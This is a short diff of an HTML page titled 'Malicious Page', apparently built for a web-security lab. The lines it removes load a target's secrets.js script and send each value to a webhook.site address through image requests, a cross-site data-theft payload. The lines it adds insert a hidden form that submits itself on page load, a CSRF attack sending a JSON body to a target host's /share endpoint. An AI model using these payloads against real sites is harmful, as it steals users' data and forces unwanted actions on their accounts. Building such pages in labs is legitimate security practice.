@@ -1,25 +1,19 @@
 <!DOCTYPE html>
 <html>
+
 <head>
   <title>Malicious Page</title>
 </head>
+
 <body>
   <h1>Welcome to the Malicious Page</h1>
   <p>If you see this, you might be at risk!</p>
-  
+  <form id="csrf" action="http://ptl-c14f5df8-12d471f9.libcurl.so/share" method="POST" enctype="text/plain">
+    <input type="hidden" name="data" value='{"user":"test","id":"0"}'>
+  </form>
   <script>
-    function display(data) {
-      for (var key in data) {
-        var img = new Image();
-        img.src = "http://webhook.site/4314bf30-5ce3-4919-a7ea-d88e77b2eb85/?data="%2BencodeURIComponent(data[key]);
-        document.body.appendChild(img);
-      }
-    }
-
-    // Make a request to the target JavaScript page to trigger the display function
-    var script = document.createElement("script");
-    script.src = "http://ptl-73680598-92c73aa8.libcurl.so/secrets.js";  // replace with the actual URL
-    document.body.appendChild(script);
+    document.getElementById("csrf").submit();
   </script>
 </body>
+
 </html>
